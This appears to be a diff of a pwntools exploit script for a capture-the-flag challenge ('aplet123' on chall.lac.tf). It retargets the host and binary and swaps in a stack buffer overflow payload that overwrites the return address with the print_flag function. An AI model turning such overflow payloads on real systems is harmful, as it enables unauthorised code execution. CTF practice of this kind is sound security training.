@@ -5,7 +5,7 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-elf = context.binary = ELF('../bangla/chal', checksec=False)
+elf = context.binary = ELF('../lactf/aplet123', checksec=False)
 
 # Enable verbose logging so we can see exactly what is being sent (info/debug)
 # context.log_level = 'debug'
@@ -17,8 +17,8 @@ context.terminal = ['tmux', 'splitw', '-h']
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141
-host = args.HOST or '45.76.177.238'
-port = int(args.PORT or 9333)
+host = args.HOST or 'chall.lac.tf'
+port = int(args.PORT or 31123)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -197,6 +197,7 @@ continue
 
 
 io = start()
-payload = cyclic(12) + cyclic(4) + pack(0x1569) + pack(0xcafe69)
+ret = 0x0000000000401016
+payload = cyclic(72) + pack(elf.sym.print_flag)
 io.sendline(payload)
 io.interactive()
